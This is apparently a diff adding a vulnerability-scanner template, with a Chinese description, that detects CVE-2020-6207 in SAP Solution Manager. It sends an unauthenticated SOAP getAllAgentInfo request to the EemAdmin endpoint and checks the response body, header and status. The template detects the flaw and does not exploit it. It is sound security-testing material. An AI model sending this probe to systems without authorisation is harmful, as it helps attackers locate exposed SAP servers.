@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "通过向 SAP Solution Manager 的 EemAdminService/EemAdmin 端点发送未认证的 SOAP 请求，验证 getAllAgentInfo 接口是否返回正常响应以检测缺失身份验证漏洞"
+id = "POC-AVE-2020-1688"
+name = "SAP Solution Manager EemAdmin 远程命令执行 PoC"
+severity = "critical"
+tags = ["ave-2020-1688"]
+vuln_id = [
+    "CVE-2020-6207",
+    "AVE-2020-1688",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/EemAdminService/EemAdmin"
+protocol = "http"
+
+[poc.requests.body]
+content = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/"><soapenv:Header/><soapenv:Body><adm:getAllAgentInfo/></soapenv:Body></soapenv:Envelope>'
+type = "raw"
+
+[poc.requests.headers]
+Connection = "close"
+Content-Type = "text/xml; charset=UTF-8"
+SOAPAction = '""'
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [":getAllAgentInfoResponse"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["SAP NetWeaver Application Server"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
